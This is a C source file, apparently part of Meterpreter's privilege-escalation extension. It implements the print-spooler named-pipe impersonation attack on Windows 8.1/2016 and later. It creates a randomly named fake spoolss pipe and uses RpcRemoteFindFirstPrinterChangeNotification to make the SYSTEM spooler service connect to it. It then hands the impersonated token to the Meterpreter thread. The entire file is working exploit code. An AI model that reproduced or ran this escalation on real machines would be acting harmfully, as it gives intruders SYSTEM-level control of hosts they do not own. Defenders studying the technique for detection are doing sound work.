#include "precomp.h"
#include "common_metapi.h"
#include "namedpipe.h"

typedef void* PRINTER_HANDLE;
typedef wchar_t* STRING_HANDLE;

typedef struct _DEVMODE_CONTAINER {
	DWORD cbBuf;
	BYTE* pDevMode;
} DEVMODE_CONTAINER;

DWORD RpcOpenPrinter(STRING_HANDLE pPrinterName, PRINTER_HANDLE* pHandle, wchar_t* pDatatype, DEVMODE_CONTAINER* pDevModeContainer, DWORD AccessRequired);
DWORD RpcClosePrinter(PRINTER_HANDLE* phPrinter);
DWORD RpcRemoteFindFirstPrinterChangeNotification(PRINTER_HANDLE hPrinter, DWORD fdwFlags, DWORD fdwOptions, wchar_t* pszLocalMachine, DWORD dwPrinterLocal, DWORD cbBuffer, BYTE* pBuffer);

typedef NTSTATUS(WINAPI* PRtlGetVersion)(LPOSVERSIONINFOEXW);

DWORD WINAPI trigger_printer_connection(LPWSTR pPipeName);

DWORD elevate_via_namedpipe_printspooler(Remote* remote, Packet* packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	THREAD* pThread = NULL;
	HANDLE hSem = NULL;
	char cPipeName1[MAX_PATH] = { 0 };
	WCHAR cPipeName2[MAX_PATH] = { 0 };
	DWORD dwPipeUid[2] = { 0, 0 };
	OSVERSIONINFOEXW os = { 0 };
	HMODULE hNtdll = NULL;
	PRtlGetVersion pRtlGetVersion = NULL;
	PRIV_POST_IMPERSONATION PostImpersonation;

	do {
		if (!does_pipe_exist(L"\\\\.\\pipe\\spoolss")) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler: \\pipe\\spoolss is not listening.");
		}

		hNtdll = GetModuleHandleA("ntdll");
		if (hNtdll == NULL) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler: Failed to resolve RtlGetVersion");
		}

		pRtlGetVersion = (PRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
		if (pRtlGetVersion == NULL) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler: Failed to resolve RtlGetVersion");
		}

		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

		if (pRtlGetVersion(&os)) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler: RtlGetVersion failed");
		}

		// Works on 2016/8.1+
		if (os.dwMajorVersion < 6 || (os.dwMajorVersion == 6 && os.dwMinorVersion < 3)) {
			SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler: Windows version not supported.")
		}

		// generate a pseudo random name for the pipe
		dwPipeUid[0] = ((rand() << 16) | rand());
		dwPipeUid[1] = ((rand() << 16) | rand());

		_snprintf_s(cPipeName1, sizeof(cPipeName1), MAX_PATH, "\\\\.\\pipe\\%08x%08x\\pipe\\spoolss", dwPipeUid[0], dwPipeUid[1]);
		_snwprintf_s(cPipeName2, sizeof(cPipeName2), MAX_PATH, L"%08x%08x", dwPipeUid[0], dwPipeUid[1]);

		hSem = CreateSemaphore(NULL, 0, 1, NULL);
		PostImpersonation.pCallback = set_meterp_thread_use_current_token;
		PostImpersonation.pCallbackParam = remote;

		pThread = met_api->thread.create(elevate_namedpipe_thread, &cPipeName1, hSem, &PostImpersonation);
		if (!pThread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler. met_api->thread.create failed",
				ERROR_INVALID_HANDLE);
		}

		if (!met_api->thread.run(pThread)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler. met_api->thread.run failed",
				ERROR_ACCESS_DENIED);
		}

		// wait for the thread to create the pipe, if it times out terminate
		if (hSem) {
			if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
				BREAK_WITH_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler. WaitForSingleObject failed",
					ERROR_ACCESS_DENIED);
			}
		}
		else {
			Sleep(500);
		}

		trigger_printer_connection(cPipeName2);

		// signal our thread to terminate if it is still running
		met_api->thread.sigterm(pThread);

		// and wait for it to terminate...
		met_api->thread.join(pThread);

		// get the exit code for our pthread
		dprintf("[ELEVATE] dwResult before exit code: %u", dwResult);
		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler. GetExitCodeThread failed",
				ERROR_INVALID_HANDLE);
		}
		dprintf("[ELEVATE] dwResult after exit code: %u", dwResult);

	} while (0);

	if (pThread) {
		met_api->thread.destroy(pThread);
	}
	if (hSem) {
		CloseHandle(hSem);
	}

	return dwResult;
}


DWORD WINAPI trigger_printer_connection(LPWSTR pPipeName)
{
	PRINTER_HANDLE hPrinter = NULL;
	DEVMODE_CONTAINER devModeContainer = { 0 };

	LPWSTR pComputerName = NULL;
	DWORD dwComputerNameLen = MAX_COMPUTERNAME_LENGTH + 1;

	LPWSTR pPrinterName = NULL;
	LPWSTR pCaptureServer = NULL;
	DWORD dwResult = ERROR_SUCCESS;
	do
	{
		pComputerName = (LPWSTR)malloc(dwComputerNameLen * sizeof(WCHAR));
		if (!pComputerName)
		{
			BREAK_ON_ERROR("[ELEVATE] Out of Memory");
		}
		if (!GetComputerNameW(pComputerName, &dwComputerNameLen))
		{
			BREAK_ON_ERROR("[ELEVATE] GetComputerNameW failed");
		}

		pPrinterName = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
		if (!pPrinterName)
		{
			BREAK_ON_ERROR("[ELEVATE] Out of Memory");
		}

		pCaptureServer = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
		if (!pCaptureServer)
		{
			BREAK_ON_ERROR("[ELEVATE] Out of Memory");
		}

		_snwprintf_s(pPrinterName, MAX_PATH, _TRUNCATE, (LPWSTR)(L"\\\\%s"), pComputerName);
		_snwprintf_s(pCaptureServer, MAX_PATH, _TRUNCATE, (LPWSTR)(L"\\\\localhost/pipe/%s"), pPipeName);

		RpcTryExcept
		{
			if (RpcOpenPrinter(pPrinterName, &hPrinter, NULL, &devModeContainer, 0) == RPC_S_OK)
			{
				RpcRemoteFindFirstPrinterChangeNotification(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, pCaptureServer, 0, 0, NULL);
				RpcClosePrinter(&hPrinter);
			}
		}
		RpcExcept(EXCEPTION_EXECUTE_HANDLER);
		{
			BREAK_WITH_ERROR("[ELEVATE] Out of Memory", RpcExceptionCode());
		}
		RpcEndExcept;

	} while (0);

	if (pComputerName)
	{
		free(pComputerName);
	}
	if (pPrinterName)
	{
		free(pPrinterName);
	}
	if (pCaptureServer)
	{
		free(pCaptureServer);
	}
	if (hPrinter)
	{
		RpcClosePrinter(&hPrinter);
	}

	return 0;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

const RPC_WSTR MS_RPRN_UUID = (RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB";
const RPC_WSTR InterfaceAddress = (RPC_WSTR)L"\\pipe\\spoolss";

// Taken from https://github.com/Paolo-Maffei/OpenNT/blob/master/printscan/print/spooler/spoolss/win32/bind.c#L65
handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	handle_t BindingHandle;
	WCHAR   ServerName[MAX_PATH + 1];
	DWORD   i;

	if (lpStr && lpStr[0] == L'\\' && lpStr[1] == L'\\') {
		// We have a servername
		ServerName[0] = ServerName[1] = '\\';

		i = 2;
		while (lpStr[i] && lpStr[i] != L'\\' && i < sizeof(ServerName)) {
			ServerName[i] = lpStr[i];
			i++;
		}

		ServerName[i] = 0;
	}
	else {
		return FALSE;
	}

	RpcStatus = RpcStringBindingComposeW(
		MS_RPRN_UUID,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)ServerName,
		InterfaceAddress,
		NULL,
		&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		return(0);
	}

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		return(0);
	}

	return(BindingHandle);
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
	RPC_STATUS       RpcStatus;

	RpcStatus = RpcBindingFree(&BindingHandle);
	return;
}